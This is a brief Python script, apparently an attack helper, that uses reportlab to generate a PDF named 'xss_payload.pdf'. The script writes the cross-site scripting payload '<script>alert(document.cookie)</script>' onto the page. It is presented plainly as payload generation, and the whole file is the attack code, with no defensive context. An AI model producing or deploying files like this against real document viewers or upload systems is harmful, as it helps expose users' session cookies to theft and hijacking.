from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# Create a PDF file with the XSS payload
def create_xss_pdf(filename):
    # Create a canvas object for the PDF
    c = canvas.Canvas(filename, pagesize=letter)
    
    # Set the position for the XSS payload
    x, y = 100, 750
    
    # Add the XSS payload to the PDF
    payload = '<script>alert(document.cookie)</script>'
    c.drawString(x, y, payload)
    
    # Save the PDF file
    c.save()

# Output PDF filename
pdf_filename = "xss_payload.pdf"

# Generate the PDF with the XSS payload
create_xss_pdf(pdf_filename)

print(f"PDF file '{pdf_filename}' created successfully.")